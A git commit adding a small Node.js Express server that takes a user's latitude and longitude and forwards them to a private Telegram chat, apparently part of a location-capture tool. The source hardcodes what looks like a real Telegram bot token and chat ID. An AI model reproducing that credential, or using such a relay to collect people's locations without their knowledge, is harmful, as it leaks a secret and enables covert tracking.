623d0aa3ff21fab8a1c26a629ecb72c6bad8bee7
HellersonMurilo <calabianquimurilo328@gmail.com>
2025-03-24 18:31:05 -0300

    first commit

---
+++ server.js
@@ -0,0 +1,38 @@
+const express = require("express");
+const bodyParser = require("body-parser");
+const cors = require("cors");
+const axios = require("axios");
+
+const app = express();
+app.use(cors());
+app.use(bodyParser.json());
+
+const TELEGRAM_BOT_TOKEN = "7758130187:AAF1XznSqXXyI84Pt_FUN8lrza39Yn8d1Pw"; // Substitua pelo token do seu bot
+const TELEGRAM_CHAT_ID = "5508688018"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+
+app.post("/send-location", async (req, res) => {
+  const { latitude, longitude } = req.body;
+
+  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+
+  try {
+    // Envia a localização para o Telegram
+    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+    });
+
+    if (response.data.ok) {
+      res.status(200).json({ success: true });
+    } else {
+      res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
+    }
+  } catch (error) {
+    console.log(error);
+    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
+  }
+});
+
+app.listen(8088, () => {
+  console.log("Servidor rodando na porta 8088");
+});
